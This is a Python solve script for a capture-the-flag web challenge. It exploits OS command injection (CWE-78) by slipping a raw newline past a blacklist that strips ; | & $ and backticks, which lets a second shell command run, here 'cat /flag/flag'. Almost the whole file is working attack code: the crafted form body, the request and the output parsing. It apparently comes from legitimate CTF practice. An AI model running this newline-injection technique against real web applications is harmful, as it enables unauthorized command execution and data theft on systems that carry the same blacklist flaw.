#!/usr/bin/env python3
"""
ShelfTag (inj, 100) — CWE-78 OS command injection via an un-blacklisted newline.

The label text is interpolated unquoted into a shell command; the blacklist strips
; | & $ ` but not \n. A raw newline ends the first command so the second line runs
on its own. The flag is /flag/flag (named in /app/app.py).

Usage:
    python3 solve.py                          # defaults to inj2.chal.deti:8041
    python3 solve.py http://inj2.chal.deti:8041
"""
import re
import sys

import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://inj2.chal.deti:8041"
FLAG_RE = re.compile(r"flag\{[^}]*\}")


def run(cmd: str) -> str:
    """Inject `cmd` as the second line; return the <pre> output."""
    # raw %0A newline; requests form-encodes, so send the body ourselves
    body = f"sku=a1&text=x%0A{requests.utils.quote(cmd)}"
    r = requests.post(f"{BASE}/label", data=body,
                      headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=10)
    m = re.search(r"<pre[^>]*>(.*?)</pre>", r.text, re.S)
    return m.group(1).strip() if m else r.text


def main() -> int:
    out = run("cat /flag/flag")
    m = FLAG_RE.search(out)
    print(f"[+] FLAG: {m.group(0)}" if m else f"[i] output:\n{out}")
    return 0 if m else 1


if __name__ == "__main__":
    raise SystemExit(main())
